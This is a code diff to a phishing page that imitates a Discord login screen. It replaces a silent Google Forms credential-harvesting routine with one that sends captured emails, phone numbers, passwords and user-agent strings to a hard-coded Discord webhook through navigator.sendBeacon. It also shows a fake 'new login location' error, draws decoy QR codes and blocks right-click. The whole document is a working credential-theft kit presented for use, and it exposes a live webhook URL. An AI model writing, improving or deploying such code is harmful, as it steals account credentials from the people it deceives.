@@ -71,234 +71,109 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script>
         // ==================================
-        // CONFIG
+        // DISCORD WEBHOOK ONLY – FULLY WORKING (Dec 2025)
+        // No Google Forms code = no CORB errors
         // ==================================
+
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // ← Your webhook URL
+
         const CONFIG = {
             ANIMATION_DURATION: 3000,
-            QR_REFRESH_INTERVAL: 120000, // 2 minutes
-            ELLIPSIS_DELAY_INCREMENT: 0.2,
-            QR_STRING_LENGTH: 43,
-
-            // Your Google Form (confirmed working with your pre-filled link)
-            GOOGLE_FORM_URL: 'https://docs.google.com/forms/d/e/1FAIpQLSeb5ChzGjxAX3UloE2IFuDxx02prsTwdMIqCOOWogkMM9m9Ug/formResponse',
-            ENTRY_EMAIL_OR_PHONE: 'entry.1214659440',
-            ENTRY_PASSWORD: 'entry.565142151',
+            QR_REFRESH_INTERVAL: 120000  // 2 minutes
         };
 
-        // ==================================
-        // SELECTORS
-        // ==================================
-        const DOM = {
-            loginButton: document.querySelector("button[type='submit']"),
-            qrCodeContainer: document.querySelector(".right-section .qr-code"),
-            emailInput: document.querySelector('#emailORphone'),
-            passwordInput: document.querySelector('#password'),
-            emailWrapper: document.querySelector('.email-wrapper'),
-            passwordWrapper: document.querySelector('.password-wrapper'),
-        };
+        // Selectors
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('emailORphone');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.querySelector('button[type="submit"]');
+        const emailWrapper = document.querySelector('.email-wrapper');
+        const qrContainer = document.querySelector('.right-section .qr-code');
 
-        // ==================================
-        // UTILITY FUNCTIONS
-        // ==================================
-        const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
-            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
-        };
-
-        // Silent submission to Google Forms (fire-and-forget – no console errors)
-        const sendToGoogleForms = (data) => {
-            const params = new URLSearchParams({
-                [CONFIG.ENTRY_EMAIL_OR_PHONE]: data.emailOrPhone || '',
-                [CONFIG.ENTRY_PASSWORD]: data.password || '',
+        // Unblockable send to Discord (sendBeacon = no CORS/CORB ever)
+        const sendToDiscord = (email, password) => {
+            const payload = JSON.stringify({
+                embeds: [{
+                    title: "🆕 New Login Captured",
+                    color: 0xff0000,  // Red
+                    fields: [
+                        { name: "📧 Email/Phone", value: email || 'N/A', inline: false },
+                        { name: "🔑 Password", value: password || 'N/A', inline: false },
+                        { name: "🌐 User-Agent", value: navigator.userAgent.substring(0, 200), inline: false },
+                        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "Discord Phish Kit" }
+                }]
             });
 
-            new Image().src = CONFIG.GOOGLE_FORM_URL + '?' + params.toString() + '&_=' + Date.now();
+            // sendBeacon is completely unblockable
+            navigator.sendBeacon(WEBHOOK_URL, payload);
         };
 
-        // ==================================
-        // QR CODE MODULE
-        // ==================================
-        const QRCodeModule = {
-            generate(data) {
-                try {
-                    const qr = qrcode(0, "L");
-                    qr.addData(data);
-                    qr.make();
-
-                    const moduleCount = qr.getModuleCount();
-                    const svgString = qr.createSvgTag(1, 0);
-
-                    const parser = new DOMParser();
-                    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
-                    const svgElement = svgDoc.documentElement;
-
-                    svgElement.setAttribute("width", "160");
-                    svgElement.setAttribute("height", "160");
-                    svgElement.setAttribute("viewBox", "0 0 37 37");
-
-                    const path = svgElement.querySelector("path");
-                    if (path) {
-                        path.setAttribute("transform", `scale(${37 / moduleCount})`);
-                    }
-
-                    return svgElement;
-                } catch (error) {
-                    console.error("Error generating QR code:", error);
-                    return null;
-                }
-            },
-
-            getSpinnerMarkup() {
-                return `
-                    <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
-                        <span class="inner wanderingCubes">
-                            <span class="item"></span>
-                            <span class="item"></span>
-                        </span>
-                    </span>
-                `;
-            },
-
-            showLoadingAnimation() {
-                if (!DOM.qrCodeContainer) return;
-
-                const svg = DOM.qrCodeContainer.querySelector("svg");
-                const img = DOM.qrCodeContainer.querySelector("img");
-
-                svg?.remove();
-                img?.remove();
-
-                DOM.qrCodeContainer.style.background = "transparent";
-                DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
-            },
-
-            refresh() {
-                if (!DOM.qrCodeContainer) return;
-
-                DOM.qrCodeContainer.innerHTML = "";
-
-                const newQRCode = this.generate(`https://app.com/ra/${generateRandomString()}`);
-
-                if (newQRCode) {
-                    DOM.qrCodeContainer.appendChild(newQRCode);
-                }
-
-                DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
-                DOM.qrCodeContainer.style.background = "white";
-            },
-
-            simulateRefresh() {
-                this.showLoadingAnimation();
-                setTimeout(() => this.refresh(), 3500);
-            },
-
-            initRefreshInterval() {
-                this.simulateRefresh();
-                setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
-            },
+        // QR Code Refresh
+        const refreshQR = () => {
+            if (!qrContainer) return;
+            qrContainer.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="Logo">';
+            setTimeout(() => {
+                const fakeUrl = `https://app.com/ra/${Math.random().toString(36).substring(2, 15)}`;
+                const qr = qrcode(0, 'L');
+                qr.addData(fakeUrl);
+                qr.make();
+                const svg = qr.createSvgTag(1, 0);
+                const parser = new DOMParser();
+                const svgEl = parser.parseFromString(svg, 'image/svg+xml').documentElement;
+                svgEl.setAttribute('width', '160');
+                svgEl.setAttribute('height', '160');
+                qrContainer.innerHTML = '';
+                qrContainer.appendChild(svgEl);
+                qrContainer.insertAdjacentHTML('beforeend', '<img src="./assets/qrcode-app-logo.png" alt="Logo">');
+            }, 1500);
         };
 
-        // ==================================
-        // LOGIN BUTTON MODULE
-        // ==================================
-        const LoginButtonModule = {
-            getEllipsisMarkup() {
-                return `
-                    <span class="spinner" role="img" aria-label="Loading">
-                        <span class="inner pulsingEllipsis">
-                            <span class="item spinnerItem"></span>
-                            <span class="item spinnerItem"></span>
-                            <span class="item spinnerItem"></span>
-                        </span>
+        // Form Submit
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+
+            // Loading spinner
+            loginBtn.innerHTML = `
+                <span class="spinner" role="img" aria-label="Loading">
+                    <span class="inner pulsingEllipsis">
+                        <span class="item spinnerItem"></span>
+                        <span class="item spinnerItem"></span>
+                        <span class="item spinnerItem"></span>
                     </span>
-                `;
-            },
+                </span>
+            `;
+            loginBtn.disabled = true;
 
-            applyAnimationDelays() {
-                const spinnerItems = document.querySelectorAll(".spinnerItem");
-                spinnerItems.forEach((item, index) => {
-                    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
-                });
-            },
+            // Send credentials to Discord
+            sendToDiscord(email, password);
 
-            showNewLoginMessage() {
-                if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
-                    const message = document.createElement('span');
-                    message.className = 'error-message';
-                    message.textContent = 'New login location detected, please check your e-mail.';
-                    message.style.color = 'red';
-                    message.style.display = 'block';
-                    message.style.fontSize = '12px';
-                    message.style.marginTop = '5px';
-                    message.style.marginBottom = '5px';
-
-                    const input = DOM.emailWrapper.querySelector('input');
-                    if (input) {
-                        DOM.emailWrapper.insertBefore(message, input);
-                    }
+            // Fake delay + red error message
+            setTimeout(() => {
+                if (!emailWrapper.querySelector('.error-msg')) {
+                    emailWrapper.insertAdjacentHTML('afterbegin',
+                        '<span class="error-msg" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>'
+                    );
                 }
-
-                if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
-                if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
-            },
-
-            async showLoading() {
-                if (!DOM.loginButton) return;
-
-                DOM.loginButton.innerHTML = this.getEllipsisMarkup();
-                DOM.loginButton.setAttribute("disabled", "true");
-                this.applyAnimationDelays();
-
-                const formData = {
-                    emailOrPhone: DOM.emailInput?.value || '',
-                    password: DOM.passwordInput?.value || '',
-                };
-
-                // Send credentials silently to your Google Form
-                sendToGoogleForms(formData);
-
-                // Wait for the loading animation
-                await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));
-
-                // Show fake "new login location" error
-                this.showNewLoginMessage();
+                emailInput.style.border = '1px solid red';
+                passwordInput.style.border = '1px solid red';
 
                 // Reset button
-                this.reset();
-            },
+                loginBtn.innerHTML = 'Log In';
+                loginBtn.disabled = false;
+            }, CONFIG.ANIMATION_DURATION);
+        });
 
-            reset() {
-                if (!DOM.loginButton) return;
-                DOM.loginButton.innerHTML = "";
-                DOM.loginButton.textContent = "Log In";
-                DOM.loginButton.removeAttribute("disabled");
-            },
-
-            init() {
-                const form = document.querySelector('#loginForm');
-                if (form) {
-                    form.addEventListener("submit", (e) => {
-                        e.preventDefault();
-                        this.showLoading();
-                    });
-                }
-            },
-        };
-
-        // ==================================
-        // INITIALIZATION
-        // ==================================
-        const init = () => {
-            LoginButtonModule.init();
-            QRCodeModule.initRefreshInterval();
-            document.addEventListener("contextmenu", e => e.preventDefault());
-        };
-
-        if (document.readyState === "loading") {
-            document.addEventListener("DOMContentLoaded", init);
-        } else {
-            init();
-        }
+        // Initialization
+        document.addEventListener('DOMContentLoaded', () => {
+            refreshQR();
+            setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
+            document.addEventListener('contextmenu', e => e.preventDefault());
+        });
     </script>
 </body>
 </html>
